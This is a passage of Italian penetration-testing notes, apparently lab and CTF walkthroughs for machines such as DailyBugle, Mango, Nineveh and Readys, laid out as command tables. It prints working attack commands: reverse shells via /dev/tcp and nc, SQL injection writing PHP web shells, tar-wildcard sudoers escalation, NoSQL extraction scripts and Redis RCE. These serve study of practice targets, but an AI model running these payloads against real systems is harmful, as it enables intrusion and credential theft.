| **Root**              | ```<br>sudo install -m =xs $(which systemctl) .<br><br>TF=$(mktemp).service<br>echo '[Service]<br>Type=oneshot<br>ExecStart=/bin/sh -c "id > /tmp/output"<br>[Install]<br>WantedBy=multi-user.target' > $TF<br>./systemctl link $TF<br>./systemctl enable --now $TF<br>```                                                                                                                                                                                                                                  | Cercando tra i file *SUID* notiamo che √® presente `systemctl` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#suid) √® vulnerabile                                                                                                                                                                                                                                                 |

### Pebbles

| üß† **Azione**      | üíª **Comando / Metodo**                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                          |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SQLi detection** | `sqlmap http://pebbles:8080/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-cmd -t 5 --batch` | Con un fuzzing directories notiamo che utilizza *ZoneMinder v.1.29.0* che √® vulnerabile a [SQLi](https://www.exploit-db.com/exploits/41239). Proviamo ad utilizzare il Poc della guida ma non funziona, quindi usiamo `sqlmap` |
### Cockpit

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SQL injection**     | `aa' OR [SQL] OR 'a'='1`                                                                                                                                                                    | Navigando tra le pagine trovo il servizio `Blaze` che √® vulnerabile a [SQLi](https://www.exploit-db.com/exploits/33995). Uso la *1.* per bypassare l'autenticazione ed ottenere delle credenziali                                                                                                                                                                                                                                                                                                                                   |
| **Cockpit**           |                                                                                                                                                                                             | Con le credenziali trovate entro nel servizio `Cockpit` presente sulla porta `9090` e come utente james avvio una reverse shell poich√© √® presente un terminale                                                                                                                                                                                                                                                                                                                                                                      |
| **Wildcard tar SUDO** | 1. `echo 'echo "james ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > payload.sh`<br>2. `echo "" > '--checkpoint=1'`<br>3. `echo "" > '--checkpoint-action=exec=sh payload.sh'`<br>4. `sudo su` | Tra i file SUDO √® presente `tar` nel seguente modo `/usr/bin/tar -czvf /tmp/backup.tar.gz *` che comprime tutto ci√≤ che si trova in nella directory attuale. Poich√© utilizza la wildcard * allora √® vulnerabile a [Wildcard Manipulation](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa) . Come indicato dalla guida dobbiamo creiamo con la *1.* un file che ci d√† pieni permessi SUDO, con la *2.* e la *3.* indichiamo di eseguire il file creato. Infine la *4.* per diventare root |

### Hawat

| üß† **Azione**   | üíª **Comando / Metodo**                                                                         | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------- | ----------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CloudNext**   |                                                                                                 | Con un Fuzzing Directories sui targets troviamo il percorso `/cloud` dove √® presente *NextCloud*. Accediamo con le credenziali di default `admin:admin`                                                                                                                                                                                                                                                                                            |
| **Credenziali** | 1. `grep -ri "pass" .`                                                                          | All'interno di *NextCloud* √® presente un file `.zip` che una volta scaricato utilizziamo la *1.* per trovare password nella directory e subdirectory.                                                                                                                                                                                                                                                                                              |
| **SQLi**        | 1. `High' UNION SELECT '<?php echo system($_GET["cmd"]);' INTO OUTFILE '/srv/http/cmd.php'; --` | Oltre le credenziali troviamo anche come sono costruite le chiamate SELECT. Tra le chiamate SQL notiamo che il parametro `priority` non √® sanitizzato e quindi vulnerabile a SQLi. Utilizziamo la *1.* per inserire l'SQLi (codficata in URL poich√© la macchina accettava solo quella)<br><br>NB: la SQLi crea un file php in `/srv/http/cmd.php`. La webroot ce la siamo ricavati tramite il file `phpinfo()` trovato tramite fuzzing directories |
| **RCE**         | 1. `cmd.php?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.154%2F50080%200%3E%261` | Avviamo una reverse shell codificata in URL con la *1.*                                                                                                                                                                                                                                                                                                                                                                                            |


### DailyBugle

| üß† **Azione**           | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Fuzzing Directories** |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | Applicando del fuzzing directories sul sito otteniamo la cartella `/administrator` che raggiunge una pagina di login dov'√® presente il CMS *Joomla*                                                                                                                                                                                                                                                                                                                                    |
| **Joomla 3.7.0**        | 1. `joomscan -u http://IP_TARGET`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | Utilizziamo la *1.* per scannerizzare il servizio e capirne la versione (√® manualmente visibile anche dal path `/administrator/manifests/files/joomla.xml` come indicato in quetso [video](https://youtube.com/watch?v=RZi77SG5KKg&t=380)). La versione √® *Joomla 3.7.0*                                                                                                                                                                                                               |
| **SQLi**                | 1. `python3 main.py --host http://IP_TARGET`                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | La versione √® vulnerabile a [SQLi](https://github.com/BaptisteContreras/CVE-2017-8917-Joomla), quindi usiamo la *1.* per vedere il contenuto del DB e prendere la password dell'admin                                                                                                                                                                                                                                                                                                  |
| **Cracking**            | 1 `john --wordlists=/usr/share/wordlists/rockyou.txt hash`                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Troviamo la password craccata che √® `spiderman123`                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **Reverse Shell**       | 1. `nc -lvnp PORT`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Da dentro il pannello admin inseriamo una reverse shell come indica l'[articolo](https://www.hackingarticles.in/dailybugle-tryhackme-walkthrough/) . Andiamo nella seziona *template*, scegliamo *beez3*, lo modifichiamo inserendo la [reverse shell pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) , apriamo la porta con la *1.* poi navighiamo il percorso `http://IP_TARGET/templates/beez3/index.php` |
| **DB Credentials**      |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | Controlliamo il file `/var/www/html/configuration.php` e troviamo una password. La utilizziamo per entrare come utente `jjameson`                                                                                                                                                                                                                                                                                                                                                      |
| **SUDO**                | 1. *TARGET:*`sudo -l`<br>2. *KALI:*`git clone https://github.com/jordansissel/fpm`<br>3. *KALI:*`cd fpm`<br>4. *KALI:*`gem install fpm`<br>5. *KALI:*`apt-get update`<br>6. *KALI:*`apt-get install rpm -y`<br>7. *KALI:*`echo -e '#! /bin/bash\nbash-i >& /dev/tcp/IP_KALI/PORT 0>&1' > root.sh`<br>8. *KALI:*`fpm -n root -s dir -t rpm -a all --before-install root.sh .`<br>9. *TARGET:*`wget http://IP_KALI:PORT/FILE_CREATO`<br>10. *KALI:*`nc -lvnp PORT`<br>11.*TARGET:*`sudo yum localinstall FILE_CREATO -y`<br> | Con la *1.* guardiamo i file SUDO e notiamo che possiamo utilizzare `yum`. Seguendo la guida di [GTFObins](https://gtfobins.github.io/gtfobins/yum/#sudo) scarichiamo con la *2.* il file `fpm`, con *3.*-*6.* scarichiamo i pacchetti che ci servono. Creiamo una reverse shell con la *7.*. Con la *8.* creiamo il file `.rpm` da caricare sulla macchina target con la *9.*. Infine con la *11.* avviamolo                                                                          |

- [writeup](https://olivierkonate.medium.com/daily-bugle-tryhackme-writeup-9548f549a48e)

### Quackerjack

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                                                                         | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **rConfig 3.9.4** | 1. `searchsploit -m 48208.py`<br>2. *MODIFICARE RIGA 72*`exploit_req = request.get(encoded_request) a exploit_req = request.get(encoded_request, verify=False)`<br>3. `python3 48208.py https://IP_TARGET:8081` | Navigando sulla porta `8081` troviamo un'interfaccia di login per il servizio *rConfig 3.9.4* . Con la *1.* prendiamo dal DB interno l'exploit che c'interessa: effettua una SQLi su tutte le colonne del DB e ne trova le credenziali. Con la *2.* aggiungiamo alla riga *72* la voce `verify=False` altrimenti ci restituisce questo errore di certificati `SSL: CERTIFICATE_VERIFY_FAILED`.<br>Con la *3.* avviamo l'exploit ed otteniamo le credenziali admin |
| **RCE**           | 1. `searchsploit -m 48208.py`<br>2. `nc -lvnp PORT`<br>3. `python3 48241.py https://IP_TARGET:8081 USER PASS IP_KALI PORT`                                                                                      | Adesso che abbiamo le credenziali admin, con la *1.* prendiamo dal DB interno l'exploit, con la *2.* apriamo la porta in ascolto e con la *3.* avviamo l'exploit. Siamo dentro                                                                                                                                                                                                                                                                                    |
| **SUID find**     | 1. `./find . -exec /bin/sh -p \; -quit`                                                                                                                                                                         | Nel file `home/rconfig/config/config.inc.php` troviamo le credenziali per l'accesso al DB ma non ci sono serviti a nulla.<br><br>Tra i file SUID troviamo `find` che seguendo la guida su [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid) √® vulnerabile. Utilizziamo la *1.* per diventare root                                                                                                                                                        |


- [writeup](https://medium.com/@Dpsypher/proving-grounds-practice-quackerjack-373b0e4255e5)


### GameZone

| üß† **Azione**                     | üíª **Comando / Metodo**                                                                                                                                                                           | üìù **Output / Scopo**                                                                                                                                                                                                                                                                    |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Authentication Bypass**         | 1. `' OR 1=1--`<br>2. `sqlmap -r item --dbms=mysql --batch`                                                                                                                                       | Sulla pagina principale √® presente un sistema di login che possiamo bypassare con *SQLi* come in *1.*. Catturiamo la richiesta sull'input di ricerca ed utilizziamo la *2.* per prelevare le credenziali `agent47:videogamer124` per effettuare l'accesso tramite SSH                    |
| **SSH Tunneling && Webmin 1.580** | 1. `ssh -L 10000:localhost:10000 agent47@IP_TARGET`<br>2. `python3 CVE-2012-2982 -t IP_TARGET -P PASS -U USER -p PORT -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_KALI 80 >/tmp/f"` | Notiamo che tra le porte attive √® presente la `10000`, con la *1.* forwardiamo il servizio sulla nostra porta dove √® presente *Webmin 1.580* che √® vulnerabile a [RCE](https://github.com/JohnHammond/CVE-2012-2982). Utilizziamo la *2.* per avviare una reverse shell e diventare root |


- [writeup](https://doctorzorka.github.io/TryHackMe/gamezone.html)

### Usage

| üß† **Azione**      | üíª **Comando / Metodo**                                                                                                                                                                                                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SQLi**           | 1. `sqlmap -r item --batch`<br>2. `sqlmap -r item --dbs`<br>3. `sqlmap -r item -D DATABASE --tables`<br>4. `sqlmap -r item -D DATABSE -T TABLE --columns`<br>5. `sqlmap -r item -D DATABASE -T TABLE -C COLUMNS --dump` | Sulla porta `80` inserendo `'`  nell'input presente sulla pagina `/registration` scopriamo che restituisce un errore e ci√≤ potrebbe significare che √® vulnerabile a SQLi.<br>Utilizziamo la *1.*,*2.*,*3.*,*4.* e *5.* per scaricare il database                                                                                                                                                                                                                  |
| **Cracking**       | 1. `hashcat -m 3200 -a 0 hash rockyou.txt`                                                                                                                                                                              | Utilizziamo la *1.* per craccare la password dell'amministratore trovato nel database                                                                                                                                                                                                                                                                                                                                                                             |
| **Laravel 1.8.17** | 1. ![[Pasted image 20250814122340.png]]                                                                                                                                                                                 | Una volta dentro notiamo che il CMS utilizzato √® *Laravel 1.8.17* che √® vulnerabile a [File Upload](https://github.com/advisories/GHSA-g857-47pm-3r32). Andiamo su USERS e modifichiamo l'immagine dell'utente amministratore, caricando la reverse shell di pentestmonkey in php ed otteniamo l'accesso.                                                                                                                                                         |
| **Dash**           |                                                                                                                                                                                                                         | Una volta dentro la cartella troviamo delle credenziali che provandole per tutti gli utenti scopriamo che sono utilizzate dall'utente `xander`                                                                                                                                                                                                                                                                                                                    |
| **SUDO**           | 1. `strings /usr/bin/usage_management`<br>2. `touch @root.txt`<br>3. `ln -s /root/.ssh/id_rsa root.txt`<br>4. `sudo /usr/bin/usage_management`                                                                          | L'utente `xander` ha i permessi per eseguire come root il file `/usage_management`. Leggendo con la *1.* il suo contenuto scopriamo che utilizza `7za` che secondo questo [link]() √® vulnerabile.<br>Spostiamoci nella cartella che zippa `/var/www/html` e con la *2.* indichiamo la lista di file che vogliamo leggere e con la *3.* un symlink al file che ci interessa. Utilizziamo la *4.* per avviare lo zip del file ed ottenre la chiave privata del root |


- [writeup](https://olivierkonate.medium.com/hackthebox-usage-f9c7e12818cd)

## Default Credentials

### Keeper

| üß† **Azione**             | üíª **Comando / Metodo**                                                                  | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------------- | ---------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Request Tracker 4.4.4** |                                                                                          | Sulla porta `80` troviamo il servizio *Request Tracker 4.4.4* con cui bypassiamo il sistema di login con le credenziali di default `root:password`. All'interno del servizio troviamo le credenziali `lnogaard:Welcome2023!` con cui entriamo tramite *SSH*                                                                                                                                                                                                       |
| **KeePass**               | 1. `python3 keepass_dump.py -f KeePassFullDump.dmp`<br>2. `kpcli --kdb passcodes.kdbx`   | Nella home dell'utente troviamo il file `KeePassFullDump.dmp` un dump di memoria del processo KeePass ed il file `passcodes.kdbx` un database cifrato di KeePass.<br>Scarichiamo [keepass_dump.py](https://github.com/z-jxy/keepass_dump/blob/main/keepass_dump.py) ed utilizziamolo come nella *1.* per ricavare la master password dal dump. Poi utilizziamo la *2.* ed inseriamo la master password ricavata da passaggio precedente per vederne il contenuto. |
| **Putty**                 | 1. `puttygen root.ppk -O private-openssh -o id_rsa`<br>2. `ssh -i id_rsa root@IP_TARGET` | All'interno troviamo una chiave Putty `.ppk`, questa pu√≤ essere convertita in chiave *SSH* con la *1.* e poi possiamo accedere come utente root con la *2.*                                                                                                                                                                                                                                                                                                       |


- [writeup](https://0xdf.gitlab.io/2024/02/10/htb-keeper.html)

## NoSQLi

### Mango

| üß† **Azione**   | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                 |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Certificate** |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | Guardando il certificato notiamo che √® presente il sottodominio `/staging-order.mango.htb` dove √® presente una interfaccia di login                                                                                   |
| **NoSQLi**      | `username[$ne]=a&password[$ne]=a`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Intercettando la richiesta con BurpSuite e cambiando i parametri con `[$ne]` come in *1.* bypassiamo l'interfaccia di login e quindi √® vulnearbile a *NoSQLi*                                                         |
| **Usernames**   | `import requests`<br><br>`def inject(data):`<br>	`r = requests.post("http://staging-order.mango.htb/",data=data, allow_redirects=False)`<br>	`if r.status_code != 200:`<br>		`return True`<br><br>`secret = ""`<br>`payload = ""`<br>`while True:`<br>	`data = {"username[$regex]":"^" + payload +"$","password[$ne]":"a","login":"login"}`<br>	`for i in range(97,122):`<br>		`payload = secret + chr(i)`<br>		`print("\r" + payload, flush=False, end='')`<br>		`data = {"username[$regex]":"^"+ payload, "password[$ne]":"a","login":"login"}`<br>		`if inject(data):`<br>			`print("/r" + payload, flush=True, end='')`<br>			`secret = secret + chr(i)`<br>			<br>`print()`                                                                                                                            | Aggiungendo `[$regex]` su `username[$regex]=^` possiamo sfruttare la vulnerabilit√† per un blind-nosqli e ricsotruirci sia username che password degli utenti. Automatizziamo il processo con il codice sulla sinistra |
| **Passwords**   | `import requests`<br><br>`def inject(data):`<br>	`r = requests.post("http://staging-order.mango.htb/",data=data, allow_redirects=False)`<br>	`if r.status_code != 200:`<br>		`return True`<br><br>`secret = ""`<br>`payload = ""`<br>`while True:`<br>	`#data = {"username[$regex]":"^" + payload + "$","password[$ne]":"a","login":"login"}`<br>	`for i in range(32,126):`<br>		`if chr(i) in ['.','?','*','^','+','~']:`<br>			`payload = secret + "\\" + chr(i)`<br>		`else:`<br>			`payload = secret + chr(i)`<br>		`print("\r" + payload, flush=False, end='')`<br>		`data = {"username":"mango","password[$regex]":"^h3mXK8RhU~"+ payload,"login":"login"}`<br>		`if inject(data):`<br>			`print("/r" + payload, flush=True, end='')`<br>			`secret = secret + chr(i)`<br>			`break`<br>`print()`<br> | Facciamo lo stesso per la password                                                                                                                                                                                    |
| **SUID**        | 1. `find / -perm -4000 2>/dev/null`<br>2. ````<br>echo 'var BufferedReader = Java.type("java.io.BufferedReader");<br>var FileReader = Java.type("java/root/root.txtder");<br>var br = new BufferedReader(new FileReader("root.txt"));<br>while ((line = br.readLine()) != null) { print(line); }' \| jjs````                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Con la *1.* controlliamo i file SUID `jjs` e troviamo che √® vulnerabile secondo [GTFObins](https://gtfobins.github.io/gtfobins/jjs/#suid)<br>Scriviamo in un file la *2.* ed usiamolo per leggere il root.txt         |

## LFI

### Nineveh

| üß† **Azione**        | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                   | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                           |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Bruteforce**       | 1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/departement/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Invalid"`<br>2. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"` | Avviamo un bruteforce sia verso la pagina di login del web *1.* e sia verso la pagina di login `phpLiteAdmin 1.9.3` sapendo che lo username del secondo √® admin per default.<br><br>Troviamo le seguenti credenziali `admin:1q2w3e4r5t` e `admin:password123`                                                                                                                                                                                   |
| **phpLiteAdmin RCE** | 1. *CREA DATABASE*<br>2. *CREA TABELLA*<br>3. *INSERISCI RIGA CON CODICE:* `<?php echo system($_REQUEST['cmd']); ?>`<br>4. *SFRUTTA LFI PER AVVIARLO*                                                                                                                                                                                                     | Notiamo che un parametro della web application √® vulnerabile a LFI dunque possiamo sfruttarlo per la vulnerabilit [phpLiteAdmin 1.9.3 RCE](https://www.exploit-db.com/exploits/24044).                                                                                                                                                                                                                                                          |
| **Port knocking**    | 1. `netstat -tuln`<br>2. `ps -aux`<br>3. `cat /etc/knockd.conf`<br>4. `knock -v 10.10.10.43 PORT1 PORT2 PORT3 -d 500`<br>5. `ssh -i id_rsa amrois@10.10.10.43`                                                                                                                                                                                            | Troviamo una *private key RSA* in un file, ma la porta 22 non √® stata rilevata da nmap e ci√≤ sembra sospetto. Per toglierci ogni dubbio eseguiamo la *1.* sulla macchina target e notiamo che la porta 22 √® in ascolto. Eseguiamo il *2.* e notiamo che l'utente root sta eseguendo il knockd probabilmente sulla porta 22.<br>Controlliamo con la *3.* il file di configurazione per sapere come bussare alla porta SSH ed aprirla con la *4.* |
| **pspy**             | 1. `echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1' > /tmp/update`<br>2. `chmod +x /tmp/update`<br>3. `nc -lnvp 443`                                                                                                                                                                                                                      | Ci accorgiamo che un file √® generato nella cartella dell'utente ogni minuto, perci√≤ utilizziamo [pspy](https://github.com/DominicBreuker/pspy) sulla macchina target per vedere se ci sono cronjobs attivi. <br>Viene eseguito periodicamente il file `chrootkit` che esegue molti comandi tra cui `/tmp/update` che sovrascrivibile dunque inseriamo una reverse shell ed attendiamo                                                           |

### Readys

| üß† Azione            | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Wordpress**        | 1. `docker run -it --rm wpscanteam/wpscan --url http://IP_TARGET --enumerate u,p,t`<br>2. `docker run -it --rm -v /usr/share/wordlists:/mnt wpscanteam/wpscan --url http://IP_TARGET --passwords /mnt/rockyou.txt`                                                                                                 | Il sito utilizza chiaramente `wordpress` dunque usiamo la *1.* per avviare wpscan. Proviamo un bruteforce con la *2.* ma non otteniamo risultati                                                                                                                                                                                                                                                                                                               |
| **LFI**              | 1. `http://IP_TARGET/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`<br>2. `http://IP_TARGET/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf`             | Tra i plugin presenti su Wordpress troviamo *SiteEditor* che √® vulnerabile a [LFI](https://www.exploit-db.com/exploits/44340). <br>Facciamo il PoC con la *1.* e vediamo che tra gli utenti √® presente *Redis* che nella scansione iniziale non era presente; ci√≤ significa che il servizio dovrebbe essere attivo. Navighiamo con la *2.* per trovare il file di configurazione `/etc/redis/redis.conf`. Con CTRL+F cerco 'pass' e trovo la password di Redis |
| **RCE Redis**        | 1. `wget https://raw.githubusercontent.com/Ridter/redis-rce/refs/heads/master/redis-rce.py`<br>2. `wget https://github.com/n0b0dyCN/redis-rogue-server/raw/refs/heads/master/exp.so`<br>3. `python3 redis-rce.py -r IP_TARGET -L IP_KALI -f exp.so -a PASS -P 80 -v` (scegli la reverse shell appena te lo chiede) | Scarichiamo con la *1.* lo [script](https://raw.githubusercontent.com/Ridter/redis-rce/refs/heads/master/redis-rce.py) per RCE su Redis. Scarichiamo con la *2.* il git dov'√® presente il modulo [exp.so](https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so) ed infine usiamo la *3.* per avviare una shell                                                                                                                                    |
| **Lateral movement** | 1. ```echo "<?php<br>\$output = null;<br>\$retval = null;<br>exec('nc -e /bin/bash IP_KALI PORT', \$output, \$retval);<br>echo \"Returned with Status \$retval and output:\\n\";<br>print_r(\$output);<br>?>" > shell.php```                                                                                       | Inseriamo una reverse shell con la *1.* come utente `redis` e navighiamo la pagina dall'LFI trovato precedentemente. Adesso siamo utente `alice`                                                                                                                                                                                                                                                                                                               |
| **CronJobs**         | 1. `echo '#! /bin/bash' > rev.sh`<br>2. `echo 'nc -e /bin/sh IP_KALI PORT' >> rev.sh`<br>3. `chmod +x exploit.sh`<br>4. `echo "" > '--checkpoint=1'`<br>5. `echo "" > '--checkpoint-action=exec=bash rev.sh'`<br>                                                                                                  | Guardando il file `/etc/crontab` notiamo che il root esegue un file dove al suo interno √® eseguito questo comando `tar -cf /opt/backups/website.tar *`. Il comando comprime dei file presenti nella cartella `/var/www/html`. Creiamo un file come in *4.* e *5.* per far eseguire una reverse shell creata da noi in *1.* e *2.*                                                                                                                              |


### Tomghost

| üß† Azione | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                 | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Jserv** | 1.`python3 tomcat.py IP_TARGET -f /WEB-INF/web.xml -p 8009`                                                                                                                                                                                                                                                                                                         | Dalla scansione di nmap notiamo che √® presente *Jserv* sulla porta `8009` che √® vulnerabile a [LFI](https://github.com/dacade/CVE-2020-1938). Con la *1.* leggiamo il file con le credenziali `skyfuck:8730281lkjlkjdqlksalks` con cui accediamo tramite ssh                                                                                                                                                                                                                                                                     |
| **PGP**   | 1. *KALI*`scp skyfuck@IP_TARGET:/home/skyfuck/tryhackme .`<br>2. *KALI*`scp skyfuck@IP_TARGET:/home/skyfuck/credential.pgp .`<br>3. *KALI*`gpg2john tryhackme.asc > hash`<br>4. *KALI*`john --wordlist=/usr/share/wordlists/rockyou.txt hash` (otteniamo il PASSPHRASE)<br>5. *KALI*`gpg --import tryhackme.asc`<br>6. *KALI*`credential.pgp` (inserire PASSPHRASe) | Nella cartella dell'utente troviamo file `tryhackme.asc` e `credential.pgp` che sono utilizzati per la firma digitale. Potremmo decriptarli in locale ed ottenere le credenziali come indicato su questo [articolo](https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key)<br><br>Utilizziamo la *1.* e *2.* per caricarli in locale. Con la *3.* e *4.* cracchiamo la chiave ed otteniamo il passphrase da inserire nella *6.*.  Da questo procedimento otteniamo le credenziali di `merlin` ed entriamo con SSH |
| **SUDO**  | 1. `TF=$(mktemp -u)`<br>2. `sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'`                                                                                                                                                                                                                                                                                         | Tra i comandi SUDO notiamo che `merlin` pu√≤ eseguire il comando `zip` dunque usiamo [GTFObins](https://gtfobins.github.io/gtfobins/zip/#sudo) per diventare root                                                                                                                                                                                                                                                                                                                                                                 |

- [writeup](https://github.com/0xNirvana/Writeups/blob/master/TryHackMe/Easy/tomghost/tomghost.md)

### SPX

| üß† Azione              | üíª Comando / Metodo                                                                                                                      | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SPX**                | 1.`python3 tomcat.py IP_TARGET -f /WEB-INF/web.xml -p 8009`                                                                              | Con un Fuzzing Directories troviamo il path `/phpinfo` che ci mostra con esattezza che il sistema operativo √® `Linux SPX 0.4.15` che √® vulnerabile a [LFI](https://github.com/BubblyCola/CVE_2024_42007). <br><br>All'interno del file cambiamo il parametro `?SPX_KEY=` della *riga 15* con la chiave `spx.http_key` presente nella pagina phpinfo. Infine avviare la *1.*<br><br>NB: Catturare la richiesta col proxies poich√© il tool potrebbe erroneamente dirti che non √® vulnerabile |
| **Cracking**           | 1. `john hash --wordlist=/usr/share/wordlists/rockyou.txt`                                                                               | Dalla pagina PHPINFO possiamo dedurre che il percorso file sia `/var/www/html`. Con la vulnerabilit√† *LFI* andiamo a vedere la pagina di login `/var/www/html/index.php` in chiaro, da qui ci ricaviamo le credenziali hashate in *bcrypt*; utilizziamo la *1.* per decriptarle.                                                                                                                                                                                                           |
| **File Tiny Manager**  |                                                                                                                                          | Una volta entrati dentro il servizio *File Tiny Manager*, andiamo su UPLOAD (in alto a destra) e carichiamo la reverse shell in php. Navighiamo `http://IP_TARGET/reverse.php` ed otteniamo accesso alla macchina                                                                                                                                                                                                                                                                          |
| **Credentials reused** |                                                                                                                                          | Proviamo le password precedentemente trovate sull'utente `profiler` e riusciamo ad entrare                                                                                                                                                                                                                                                                                                                                                                                                 |
| **Makefile**           | 1. `echo -e "all:\n\t@echo "Do anything"\ninstall:\n\tchmod u+s /bin/bash"`<br>2. `sudo /usr/bin/make install -C /home/profiler/php-spx` | Tra i permessi SUDO abbiamo `/usr/bin/make install -C /home/profiler/php-spx` ci√≤ significa che possiamo cambiare il file *Makefile* come nella *1.* per rendere `/bin/bash` come file SUID e quindi diventare root                                                                                                                                                                                                                                                                        |

- [writeup](https://medium.com/@mu.aktepe18/spx-proving-ground-walk-through-57590e101bc2)

### Mantis

| üß† Azione              | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                              |
